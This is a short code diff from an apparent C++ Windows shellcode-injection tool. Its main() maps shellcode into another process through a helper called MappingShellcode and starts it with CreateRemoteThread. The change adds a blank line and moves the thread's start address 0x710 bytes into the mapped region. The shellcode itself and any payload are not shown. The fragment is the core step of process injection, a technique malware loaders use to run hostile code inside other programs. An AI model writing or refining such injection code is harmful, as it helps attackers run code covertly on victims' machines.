@@ -21,6 +21,7 @@ int main() {
 		CloseHandle(hTargetProcess);
 		return -1;
 	}
+
 	std::cout << dwShellcodeSize << std::endl;
 	LPVOID lpRemoteAddr = nullptr;
 	if (!MappingShellcode(hTargetProcess, lpShellcode, dwShellcodeSize, &lpRemoteAddr)) {
@@ -30,5 +31,5 @@ int main() {
 		return -1;
 	}
 
-	CreateRemoteThread(hTargetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpRemoteAddr, NULL, 0, NULL);
+	CreateRemoteThread(hTargetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD64)lpRemoteAddr + 0x710), NULL, 0, NULL);
 }
